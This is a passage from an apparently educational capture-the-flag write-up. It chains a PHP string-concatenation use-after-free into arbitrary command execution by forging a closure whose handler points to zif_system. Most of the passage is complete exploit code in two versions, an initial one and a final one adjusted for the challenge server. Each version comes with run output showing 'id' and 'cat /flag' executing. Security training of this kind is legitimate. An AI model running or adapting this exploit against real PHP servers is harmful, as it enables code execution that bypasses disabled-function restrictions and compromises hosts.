    gc = {
      refcount = 0x2, 
      u = {
        type_info = 0x18
      }
    }, 
    handle = 0x5, 
    ce = 0x5555567ea530, 
    handlers = 0x55555676daa0 <closure_handlers>, 
...
    internal_function = {
      type = 0x1, 
      arg_flags = "\000\000", 
      fn_flags = 0x2100001, 
      function_name = 0x7ffff3e01960, 
      scope = 0x7ffff3e032a0, 
      prototype = 0x0, 
      num_args = 0x1, 
      required_num_args = 0x1, 
      arg_info = 0x7ffff3e6b0c0, 
      handler = 0x555555965e1b <zif_system>, <---- :D
      module = 0x200000000, 
      reserved = {0x7ffff3e72140, 0x7ffff3e03630, 0x7ffff3e5ce90, 0x0, 0x7ffff3e8d018, 0x7ffff3e8d010}
    }
...
```

Chaining all together the exploit is:

```php
<?php

class Helper { public $a, $b, $c, $d; } 

class exploit {
    public function __construct($cmd) {
        $concat_result_addr = $this->leak_heap();
        print "[+] Concated string address:\n0x";
        print dechex($concat_result_addr);
        $this->placeholder = $this->alloc(0x4F, "B");
        $placeholder_addr = $concat_result_addr+0xe0;
        print "\n[+] Placeholder string address:"; 
        print "\n0x".dechex($placeholder_addr);
        $this->free($placeholder_addr);
        $this->helper = new Helper;
        $this->helper->a = "KKKK";
        $this->helper->b = function ($x) { };
        print "\n[+] std_object_handlers:\n";
        $std_object_handlers = $this->str2ptr($this->placeholder);
        print "0x" . dechex($std_object_handlers) . "\n";
        $closure_addr = $this->str2ptr($this->placeholder, 0x20);
        print "[+] Closure:\n";
        print "0x" . dechex($closure_addr) . "\n";
       
        $basic = $this->get_basic_funcs($std_object_handlers);
        print "[+] basic_funcs:\n";
        print "0x" . dechex($basic) . "\n";
        $system = $this->get_system($basic);
        print "[+] zif_system:\n";
        print "0x" . dechex($system);

        $fake_obj_offset = 0xd8;
        for ($i = 0; $i < 0x110; $i += 8) {
            $this->write($this->placeholder, $fake_obj_offset + $i, $this->leak($closure_addr-0x10+$i));
        }
        $fake_obj_addr = $placeholder_addr +  $fake_obj_offset + 0x18;
        print "\n[+] Fake Closure addr:\n0x" . dechex($fake_obj_addr) . "\n\n";
        $this->write($this->placeholder, 0x20, $fake_obj_addr);
        $this->write($this->placeholder, $fake_obj_offset + 0x38, 1, 4); # internal func type
        $this->write($this->placeholder, $fake_obj_offset + 0x68, $system); # internal func handler
        
        ($this->helper->b)($cmd);
    }

    private function leak_heap() {
		$contiguous = [];
     		for ($i = 0; $i < 10; $i++) {
				$contiguous[] = $this->alloc(0x100, "D");
     		}
        $arr = [[1,3,3,7], [5,5,5,5]];
        set_error_handler(function() use (&$arr, &$buf) {
            $arr = 1337;
            $buf = str_repeat("\x00", 0x100);
        });
        $arr[1] .= $this->alloc(0x4A, "F");
        return $this->str2ptr($buf, 16);
    }

    private function free($var_addr) {

        $contiguous = [];
            for ($i = 0; $i < 10; $i++) {
                $contiguous[] = $this->alloc(0x100, "D");
            }
        $arr = [[1,3,3,7], [5,5,5,5]];
        set_error_handler(function() use (&$arr, &$buf, &$var_addr) {
            $arr = 1;
            $buf = str_repeat("AAABAACAADAAEAAF" . $this->ptr2str($var_addr) . "IAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABY", 0x1);
        });
        $arr[1] .= 1337;
    }


    private function alloc($size, $canary) {
        return str_shuffle(str_repeat($canary, $size));
    }


    private function str2ptr($str, $p = 0, $n = 8) {
        $address = 0;
        for($j = $n - 1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p + $j]);
        }
        return $address;
    }

    private function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    private function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for ($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    private function leak($addr, $p = 0, $s = 8) {
        $this->write($this->placeholder, 0x10, $addr);
        $leak = strlen($this->helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    private function get_basic_funcs($base) {
        for ($i = 0; $i < 0x6700/8; $i++) {
            $leak = $this->leak($base - $i * 8);
            if (($base - $leak) > 0 && ($leak & 0xfffffffff0000000 ) == ($base & 0xfffffffff0000000 )) {
                $deref = $this->leak($leak);
                if ($deref != 0x6e69623278656800){ // 'nib2xeh\x00' ---> bin2hex
                    continue;
                }
            } else continue;
            return $base - ($i-2) * 8;
        }
    }

    private function get_system($basic_funcs) {
        $addr = $basic_funcs;
        $i = 0;
        do {
            $f_entry = $this->leak($addr-0x10);
            $f_name = $this->leak($f_entry);
            if ($f_name == 0x736500646d636c6c) { //'se\x00dmcll'
                return $this->leak($addr + 8-0x10);
            }
            $addr += 0x20;
            $i += 1;
        } while ($f_entry != 0);
        return false;
    }
}

new exploit("id");
?>
```

Fire in the hole!

```sh
➜  concat-exploit php blog05.php 
[+] Concated string address:
0x7f9e2c07a070
[+] Placeholder string address:
0x7f9e2c07a150
[+] std_object_handlers:
0x564fde7127c0
[+] Closure:
0x7f9e2c05ce00
[+] basic_funcs:
0x564fde70c760
[+] zif_system:
0x564fdd925e1b
[+] Fake Closure addr:
0x7f9e2c07a240

uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)

```


# Epilogue

If you run the exploit in our environment, you will notice that it does not work. We built the exploit for a slighly different PHP version and all our tests were executed via PHP-CLI. The changes needed are:

1. Move the `0x100` used in the `str_repeat()` to a constant. We are still atonished about this poltergeist.
2. Change the "needle" used to identify the `basic_functions` array.  From `0x6e69623278656800` to `0x73006e6962327865`.
3. Change the offset in the `get_system()` in 0x20, so the `-0x10` should be a `+0x10`

The final exploit is:

```php
<?php



class Helper { public $a, $b, $c, $d; }  //alloc(0x4F)

class exploit {
    const FILL = 0x100;
    public function __construct($cmd) {
        
        $concat_result_addr = $this->leak_heap();
        print "[+] Concated string address:\n0x";
        print dechex($concat_result_addr);
        $this->placeholder = $this->alloc(0x4F, "B");
        $placeholder_addr = $concat_result_addr+0xe0;
        print "\n[+] Placeholder string address:"; 
        print "\n0x".dechex($placeholder_addr);
        $this->free($placeholder_addr);
        $this->helper = new Helper;
        $this->helper->a = "KKKK";
        $this->helper->b = function ($x) { };
        print "\n[+] std_object_handlers:\n";
        $std_object_handlers = $this->str2ptr($this->placeholder);
        print "0x" . dechex($std_object_handlers) . "\n";
        $closure_addr = $this->str2ptr($this->placeholder, 0x20);
        print "[+] Closure:\n";
        print "0x" . dechex($closure_addr) . "\n";
       
        $basic = $this->get_basic_funcs($std_object_handlers);
        print "[+] basic_funcs:\n";
        print "0x" . dechex($basic) . "\n";
        $system = $this->get_system($basic);
        print "[+] zif_system:\n";
        print "0x" . dechex($system);


        $fake_obj_offset = 0xd8;

        for ($i = 0; $i < 0x110; $i += 8) {
            $this->write($this->placeholder, $fake_obj_offset + $i, $this->leak($closure_addr-0x10+$i));
        }

        $fake_obj_addr = $placeholder_addr +  $fake_obj_offset + 0x18;
        print "\n[+] Fake Closure addr:\n0x" . dechex($fake_obj_addr);

        $this->write($this->placeholder, 0x20, $fake_obj_addr);
        $this->write($this->placeholder, $fake_obj_offset + 0x38, 1, 4); # internal func type
        $this->write($this->placeholder, $fake_obj_offset + 0x68, $system); # internal func handler
        print "\nYour commnad, Sir:\n"; 
        print ($this->helper->b)($cmd);
    }


    private function leak_heap() {
        $contiguous = [];
        for ($i = 0; $i < 100; $i++) {
            $contiguous[] = $this->alloc(0x100, "D");
        }

        $arr = [[1,3,3,7], [5,5,5,5]];
        set_error_handler(function() use (&$arr, &$buf) {
            $arr = 1337;
            $buf = str_repeat("\x00", self::FILL);
        });
        $arr[1] .= $this->alloc(0x4F-5, "F");
        return $this->str2ptr($buf, 16);
    }
    private function free($var_addr) {

        for ($i = 0; $i < 100; $i++) {
            $contiguous[] = $this->alloc(0x100, "D");
        }

        $arr = [[1,3,3,7], [5,5,5,5]];
        set_error_handler(function() use (&$arr, &$buf, &$var_addr, &$payload) {
            $arr = 1;
            $buf = str_repeat("AAABAACAADAAEAAF" . $this->ptr2str($var_addr) . "IAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABY", 0x1);
        });
        $arr[1] .= 1337;
    }

    private function alloc($size, $canary) {
        return str_shuffle(str_repeat($canary, $size));
    }


    private function str2ptr($str, $p = 0, $n = 8) {
        $address = 0;
        for($j = $n - 1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p + $j]);
        }
        return $address;
    }

    private function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    private function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for ($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    private function leak($addr, $p = 0, $s = 8) {
        $this->write($this->placeholder, 0x10, $addr);
        $leak = strlen($this->helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    private function get_basic_funcs($base) {
        for ($i = 0; $i < 0x6900/8; $i++) {
            $leak = $this->leak($base - $i * 8);
            if (($base - $leak) > 0 && ($leak & 0xfffffffff0000000 ) == ($base & 0xfffffffff0000000 )) {
                $deref = $this->leak($leak);
                if ($deref != 0x73006e6962327865){ // 0x6e69623278656800){ // 'nib2xeh\x00' ---> bin2hex  
        continue;
                }
            } else continue;
            return $base - ($i-2) * 8;
        }
    }

    private function get_system($basic_funcs) {
        $addr = $basic_funcs;
        $i = 0;
        do {
            $f_entry = $this->leak($addr-0x10);
            $f_name = $this->leak($f_entry,8);
            if ($f_name == 0x736500646d636c6c) { //'se\x00dmcll'
                return $this->leak($addr + 8+0x10);
            }
            $addr += 0x20;
            $i += 1;
        } while ($f_entry != 0); 
        return false;
    }
}

new exploit("cat /flag");

?>

```

Upload and execute it:

<figure>
<img src="/Challenge01-PHP-UAF/flag.png" alt="AdeptsOf0xCC{PHP_is_the_UAF_land}"> 
<figcaption>
AdeptsOf0xCC{PHP_is_the_UAF_land}
</figcaption>
</figure>


# EoF

We hope you enjoyed this challenge!

Feel free to give us feedback at our twitter [@AdeptsOf0xCC](https://twitter.com/AdeptsOf0xCC).


